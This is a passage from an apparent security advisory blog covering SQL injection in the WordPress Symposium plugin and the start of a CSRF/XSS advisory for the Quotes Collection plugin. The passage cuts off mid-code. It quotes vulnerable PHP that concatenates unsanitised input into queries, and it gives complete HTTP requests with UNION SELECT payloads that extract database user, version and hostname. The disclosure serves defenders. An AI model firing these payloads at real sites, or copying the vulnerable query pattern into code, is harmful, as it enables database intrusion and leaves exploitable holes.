class="crayon-h"> </span><span class="crayon-cn">63</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c87166189088-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c87166189088-7"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">symposium_openchat</span><span class="crayon-o">&amp;</span><span class="crayon-v">chat_to</span><span class="crayon-o">=</span><span class="crayon-cn">3535</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-i">SELECT</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">version</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0031 seconds] -->
<p>Analysis of getEditDetails vulnerability<br />
The getEditDetails function in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.02/ajax/symposium_forum_functions.php?rev=552870">/ajax/symposium_forum_functions.php</a> gets the contents of a post for the edit page.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c8e680940294" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
// AJAX function to get topic details for editing
if ($_POST['action'] == 'getEditDetails') {

    if (is_user_logged_in()) {

        $tid = $_POST['tid'];   

        $details = $wpdb-&gt;get_row("SELECT * FROM ".$wpdb-&gt;prefix.'symposium_topics'." WHERE tid = ".$tid);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c8e680940294-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c8e680940294-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c8e680940294-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c8e680940294-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c8e680940294-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c8e680940294-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c8e680940294-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c8e680940294-8">8</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c8e680940294-1"><span class="crayon-c">// AJAX function to get topic details for editing</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c8e680940294-2"><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'action'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">==</span><span class="crayon-h"> </span><span class="crayon-s">'getEditDetails'</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c8e680940294-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c8e680940294-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-e">is_user_logged_in</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f28c8e680940294-5">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c8e680940294-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tid</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">_POST</span><span class="crayon-sy">[</span><span class="crayon-s">'tid'</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp; </span></div><div class="crayon-line" id="crayon-53c9878f28c8e680940294-7">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c8e680940294-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">details</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_row</span><span class="crayon-sy">(</span><span class="crayon-s">"SELECT * FROM "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-sy">.</span><span class="crayon-s">'symposium_topics'</span><span class="crayon-sy">.</span><span class="crayon-s">" WHERE tid = "</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">tid</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0024 seconds] -->
<p>It checks if you&#8217;re logged in, and then takes the tid POST parameter and concatenates it into a SQL query without casting it to an integer or otherwise sanitizes it. This means we can exploit it by making a request like this:</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f28c94038241177" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
POST /wordpress/wp-content/plugins/wp-symposium/ajax/symposium_forum_functions.php HTTP/1.1
Host: 192.168.80.130
Cookie: wordpress_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7Ccb77d4fd4fcd2448f70ceefc746f38fe;  wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259=admin%7C1340114858%7C486bd8321f9973799f837e666abb40f4;
Content-Type: application/x-www-form-urlencoded
Content-Length: 149

action=getEditDetails&amp;tid=2323 UNION SELECT system_user(), 2, @@datadir, @@version, user(), 6, 7, @@hostname, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f28c94038241177-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c94038241177-2">2</div><div class="crayon-num" data-line="crayon-53c9878f28c94038241177-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c94038241177-4">4</div><div class="crayon-num" data-line="crayon-53c9878f28c94038241177-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f28c94038241177-6">6</div><div class="crayon-num" data-line="crayon-53c9878f28c94038241177-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f28c94038241177-1"><span class="crayon-i">POST</span><span class="crayon-h"> </span><span class="crayon-o">/</span><span class="crayon-i">wordpress</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">content</span><span class="crayon-o">/</span><span class="crayon-i">plugins</span><span class="crayon-o">/</span><span class="crayon-i">wp</span><span class="crayon-o">-</span><span class="crayon-i">symposium</span><span class="crayon-o">/</span><span class="crayon-i">ajax</span><span class="crayon-o">/</span><span class="crayon-v">symposium_forum_functions</span><span class="crayon-sy">.</span><span class="crayon-e">php </span><span class="crayon-i">HTTP</span><span class="crayon-o">/</span><span class="crayon-cn">1.1</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c94038241177-2"><span class="crayon-i">Host</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">192.168.80.130</span></div><div class="crayon-line" id="crayon-53c9878f28c94038241177-3"><span class="crayon-i">Cookie</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-v">wordpress_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7Ccb77d4fd4fcd2448f70ceefc746f38fe</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-v">wordpress_logged_in_f3e14e7fde6969eb515c450fed50d259</span><span class="crayon-o">=</span><span class="crayon-i">admin</span><span class="crayon-o">%</span><span class="crayon-cn">7C1340114858</span><span class="crayon-o">%</span><span class="crayon-cn">7C486bd8321f9973799f837e666abb40f4</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c94038241177-4"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Type</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-i">application</span><span class="crayon-o">/</span><span class="crayon-i">x</span><span class="crayon-o">-</span><span class="crayon-i">www</span><span class="crayon-o">-</span><span class="crayon-i">form</span><span class="crayon-o">-</span><span class="crayon-e">urlencoded</span></div><div class="crayon-line" id="crayon-53c9878f28c94038241177-5"><span class="crayon-i">Content</span><span class="crayon-o">-</span><span class="crayon-i">Length</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-cn">149</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f28c94038241177-6">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f28c94038241177-7"><span class="crayon-v">action</span><span class="crayon-o">=</span><span class="crayon-i">getEditDetails</span><span class="crayon-o">&amp;</span><span class="crayon-v">tid</span><span class="crayon-o">=</span><span class="crayon-cn">2323</span><span class="crayon-h"> </span><span class="crayon-e">UNION </span><span class="crayon-e">SELECT </span><span class="crayon-e">system_user</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">2</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">datadir</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">version</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">user</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">7</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">@</span><span class="crayon-sy">@</span><span class="crayon-i">hostname</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">9</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">11</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">12</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">13</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">14</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">15</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">16</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">17</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">18</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0050 seconds] -->
<p><strong>Multiple blind injection spots in /ajax/symposium_mail_functions.php</strong><br />
On line 94, 101, 208, 210, 274, 276 in <a href="http://plugins.trac.wordpress.org/browser/wp-symposium/tags/12.06.02/ajax/symposium_mail_functions.php?rev=552870">/ajax/symposium_mail_functions.php</a> there is also a lack of validation of integer inputs, which allows for arbitrary query execution.</p>
					</div><!-- .entry-content -->
	
	<footer class="entry-meta">
										<span class="cat-links">
				Posted in <a href="https://charlieeriksen.github.io/category/advisories/" title="View all posts in Advisories" rel="category tag">Advisories</a>			</span>
			<span class="sep"> / </span>			
						
						<span class="tag-links">
				Tagged <a href="https://charlieeriksen.github.io/tag/symposium/" rel="tag">Symposium</a>, <a href="https://charlieeriksen.github.io/tag/wordpress-plugin/" rel="tag">Wordpress plugin</a>			</span>
			<span class="sep"> / </span>
							
				<span class="comments-link"><a href="https://charlieeriksen.github.io/2012/07/10/wordpress-symposium-plugin-multiple-sql-injection-vulnerabilities-2/#respond" title="Comment on WordPress Symposium plugin multiple SQL injection vulnerabilities">Leave a comment</a></span>
		<span class="sep"> / </span>
				
					</footer><!-- #entry-meta -->
</article><!-- #post-47 -->

				
					
<article id="post-34" class="post-34 post type-post status-publish format-standard hentry category-advisories tag-quotes-collection tag-wordpress-plugin">
	<header class="entry-header">
				<div class="entry-meta">
			<a href="https://charlieeriksen.github.io/2012/07/03/wordpress-quotes-collection-plugin-cross-site-request-forgery-vulnerability/" title="12:40 pm" rel="bookmark" class="entry-date"><time datetime="2012-07-03T12:40:23+00:00" pubdate>July 3, 2012</time></a> by Charlie Eriksen		</div><!-- .entry-meta -->
		<h2 class="entry-title"><a href="https://charlieeriksen.github.io/2012/07/03/wordpress-quotes-collection-plugin-cross-site-request-forgery-vulnerability/" title="Permalink to WordPress Quotes Collection plugin cross-site request forgery vulnerability" rel="bookmark">WordPress Quotes Collection plugin cross-site request forgery vulnerability</a></h2>

				
					</header><!-- .entry-header -->
	

		<div class="entry-content">
				<p><strong>Advisory</strong><br />
<a href="http://secunia.com/advisories/49653/">Secunia Advisory SA 49653</a></p>
<p><strong>Analysis</strong><br />
A type of vulnerability that seems to be fairly common is CSRF. You can obviously speculate as to why, but I found this interesting one. I normally won&#8217;t publish CSRF vulnerabilities, but there are cases where they can abuse the inherent trust that is put in an admin to not attempt to exploit the blog readers.</p>
<p>In this case, because the admin pages did not make use of nonces, we are able to craft a page which will make the user make a GET request with a XSS payload, which will at no point be sanitized besides being escaped for inserting into the database.</p><!-- Crayon Syntax Highlighter v2.5.0 -->

		<div id="crayon-53c9878f2955c789616854" class="crayon-syntax crayon-theme-twilight crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; float: none; clear: both; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function quotescollection_addquote($quote, $author = "", $source = "", $tags = "", $public = 'yes')
{
    if(!$quote) return __('Nothing added to the database.', 'quotes-collection');
    global $wpdb;
    $table_name = $wpdb-&gt;prefix . "quotescollection";
    if($wpdb-&gt;get_var("SHOW TABLES LIKE '$table_name'") != $table_name) 
        return __('Database table not found', 'quotes-collection');
    else //Add the quote data to the database
    {

        $quote = stripslashes($quote);
        $author = stripslashes($author);    
        $source = stripslashes($source);    
        $tags = stripslashes($tags);

        $quote = "'".$wpdb-&gt;escape($quote)."'";
        $author = $author?"'".$wpdb-&gt;escape($author)."'":"NULL";
        $source = $source?"'".$wpdb-&gt;escape($source)."'":"NULL";
        $tags = explode(',', $tags);
        foreach ($tags as $key =&gt; $tag)
            $tags[$key] = trim($tag);
        $tags = implode(',', $tags);
        $tags = $tags?"'".$wpdb-&gt;escape($tags)."'":"NULL";
        if(!$public) $public = "'no'";
        else $public = "'yes'";
        $insert = "INSERT INTO " . $table_name .
            "(quote, author, source, tags, public, time_added)" .
            "VALUES ({$quote}, {$author}, {$source}, {$tags}, {$public}, NOW())";
        $results = $wpdb-&gt;query( $insert );
        if(FALSE === $results)
            return __('There was an error in the MySQL query', 'quotes-collection');
        else
            return __('Quote added', 'quotes-collection');
   }
}</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-2">2</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-4">4</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-6">6</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-8">8</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-10">10</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-12">12</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-14">14</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-16">16</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-18">18</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-20">20</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-22">22</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-24">24</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-26">26</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-28">28</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-30">30</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-32">32</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-53c9878f2955c789616854-34">34</div><div class="crayon-num" data-line="crayon-53c9878f2955c789616854-35">35</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-line" id="crayon-53c9878f2955c789616854-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">quotescollection_addquote</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">quote</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">author</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">source</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">tags</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">""</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'yes'</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-2"><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">$</span><span class="crayon-i">quote</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">__</span><span class="crayon-sy">(</span><span class="crayon-s">'Nothing added to the database.'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'quotes-collection'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">global</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">table_name</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-v">prefix</span><span class="crayon-h"> </span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-s">"quotescollection"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">get_var</span><span class="crayon-sy">(</span><span class="crayon-s">"SHOW TABLES LIKE '$table_name'"</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">!=</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-i">table_name</span><span class="crayon-sy">)</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-e">__</span><span class="crayon-sy">(</span><span class="crayon-s">'Database table not found'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'quotes-collection'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">else</span><span class="crayon-h"> </span><span class="crayon-c">//Add the quote data to the database</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-10">&nbsp;</div><div class="crayon-line" id="crayon-53c9878f2955c789616854-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">quote</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">quote</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">author</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">author</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-13"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">source</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">source</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-14"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">tags</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">stripslashes</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">tags</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-53c9878f2955c789616854-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-v">quote</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"'"</span><span class="crayon-sy">.</span><span class="crayon-sy">$</span><span class="crayon-i">wpdb</span><span class="crayon-o">-&gt;</span><span class="crayon-e">escape</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-i">quote</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-s">"'"</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-53c9878f2955c789616854-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span 